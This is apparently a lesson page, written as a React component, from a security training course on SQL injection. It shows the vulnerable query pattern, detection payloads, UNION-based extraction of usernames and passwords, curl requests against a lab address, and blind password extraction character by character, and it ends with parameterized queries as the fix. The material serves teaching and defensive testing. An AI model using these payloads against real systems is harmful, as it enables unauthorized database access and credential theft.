import CodeBlock from '../../components/lesson/CodeBlock';
import Callout from '../../components/lesson/Callout';

export default function SqlInjection() {
  return (
    <div className="prose-hh">
      <h1>Injection Deep Dive: SQL Injection</h1>
      <p>
        SQL injection happens when user input is concatenated directly into a SQL query instead of being
        treated as pure data. Decades after it was first documented, it remains one of the highest-impact
        vulnerability classes because it can lead directly to full database compromise.
      </p>

      <h2>The vulnerable pattern</h2>
      <CodeBlock label="the mistake, in any language">{`# vulnerable — user input concatenated directly into the query
query = "SELECT * FROM products WHERE id = " + user_input

# if user_input is "1 OR 1=1", the query becomes:
# SELECT * FROM products WHERE id = 1 OR 1=1   <- returns EVERY row`}</CodeBlock>

      <h2>Detecting it</h2>
      <CodeBlock label="classic detection payloads">{`id=1'                    # a single quote often breaks the query -> SQL error in the response
id=1' OR '1'='1           # always-true condition -> returns unexpected extra data
id=1 AND 1=1               # true condition -> normal response
id=1 AND 1=2               # false condition -> different/empty response (confirms injection)`}</CodeBlock>
      <p>
        The AND 1=1 / AND 1=2 pair is the single most reliable detection technique: if the two requests
        produce <em>different</em> responses, the parameter is very likely reaching a SQL query unsanitized.
      </p>

      <h2>Exploiting it: UNION-based extraction</h2>
      <CodeBlock label="the general UNION technique">{`# step 1: find the number of columns the original query returns
id=1 ORDER BY 1--
id=1 ORDER BY 2--
id=1 ORDER BY 3--    # keep incrementing until you get an error — that tells you the column count

# step 2: once you know the column count (say, 3), inject a UNION SELECT
id=-1 UNION SELECT 1,2,3--

# step 3: replace the numbered placeholders with real queries
id=-1 UNION SELECT username, password, 3 FROM users--`}</CodeBlock>
      <Callout variant="tip">
        <p>
          Using <code>id=-1</code> (or any value guaranteed to return zero rows from the original query)
          means only your injected UNION rows come back — much easier to read the results cleanly.
        </p>
      </Callout>

      <h2>Practicing detection with curl</h2>
      <p>
        Every lab in this course that includes a SQL injection challenge is driven the same way real
        testers do it before reaching for a tool like sqlmap — hand-crafted requests via curl, reading the
        response for the tell:
      </p>
      <CodeBlock label="what you'll actually type in the lab terminal">{`curl "http://10.10.60.5/product?id=1"                 # baseline response
curl "http://10.10.60.5/product?id=1' OR '1'='1"        # if this returns MORE data than baseline -> vulnerable`}</CodeBlock>

      <h2>Blind SQL injection (when there's no visible output)</h2>
      <p>
        When the application doesn't display query results directly, you infer answers one bit at a time:
      </p>
      <CodeBlock>{`id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'
# if the page behaves differently (true branch) vs a normal page (false branch),
# you've confirmed the first character of the password is 'a' — repeat per character`}</CodeBlock>
      <p>
        This is exactly what sqlmap automates at massive scale — thousands of these micro-requests per
        second — but understanding the manual technique means you can still find and confirm SQLi even
        when automated tools get blocked by a WAF.
      </p>

      <h2>The only real fix</h2>
      <p>
        Parameterized queries (prepared statements) — where user input is passed as a bound parameter, never
        concatenated into the query string. Every modern framework supports this; SQL injection in 2026 is
        almost always a case of a developer bypassing the framework's safe default, not a missing feature.
      </p>

      <Callout variant="warn">
        <p>
          You'll practice detecting and exploiting a UNION-based SQL injection directly in this module's
          lab, using the exact <code>curl</code> workflow shown above against a simulated vulnerable
          product page.
        </p>
      </Callout>
    </div>
  );
}
